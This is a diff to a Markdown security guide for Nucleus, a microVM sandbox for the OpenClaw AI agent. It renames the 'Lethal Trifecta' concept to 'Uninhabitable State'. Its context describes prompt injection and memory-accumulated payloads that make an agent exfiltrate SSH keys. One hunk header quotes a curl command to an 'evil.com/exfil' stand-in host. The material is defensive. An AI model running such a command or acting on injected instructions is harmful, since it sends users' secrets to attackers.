@@ -27,7 +27,7 @@ On January 31, 2026, the Moltbook social network for AI agents suffered a critic
 
 This wasn't a sophisticated attack. It was a configuration oversight in a system designed to be "configured correctly by the operator."
 
-## The Lethal Trifecta
+## The Uninhabitable State
 
 Palo Alto Networks identified why OpenClaw's architecture is fundamentally dangerous:
 
@@ -43,7 +43,7 @@ When all three combine, a single prompt injection can exfiltrate your SSH keys, 
 
 OpenClaw's memory system compounds the danger. Malicious payloads don't need immediate execution—fragments can accumulate across sessions and combine later. By the time the attack triggers, the injection point is buried in conversation history.
 
-## How Nucleus Breaks the Trifecta
+## How Nucleus Breaks the Uninhabitable state
 
 Nucleus interposes a Firecracker microVM between the AI agent and tool execution:
 
@@ -78,14 +78,14 @@ Nucleus interposes a Firecracker microVM between the AI agent and tool execution
 └─────────────────────────────────────────────────────────────────┘
 ```
 
-### Trifecta Mitigation
+###  Uninhabitable state Mitigation
 
-| Trifecta Element | Nucleus Mitigation |
+|  Uninhabitable state Element | Nucleus Mitigation |
 |------------------|-------------------|
 | **Private data access** | VM sees only `/workspace`, not host filesystem |
 | **Untrusted content** | Processed inside VM, cannot escape to host |
 | **External communication** | Network namespace with egress allowlist |
-| **Persistent memory** | Lattice-guard detects trifecta combinations |
+| **Persistent memory** | Lattice-guard detects uninhabitable state combinations |
 
 ## Integration Guide
 
@@ -188,7 +188,7 @@ openclaw exec "curl http://evil.com/exfil"
 | **Request authenticity** | HMAC-SHA256 signing of all requests |
 | **Approval audit** | Cryptographically chained audit log |
 | **Secret protection** | Credentials in macOS Keychain, never in VM |
-| **Trifecta detection** | Lattice-guard alerts on dangerous combinations |
+| ** Uninhabitable state detection** | Lattice-guard alerts on dangerous combinations |
 
 ## What Nucleus Does NOT Protect Against
 
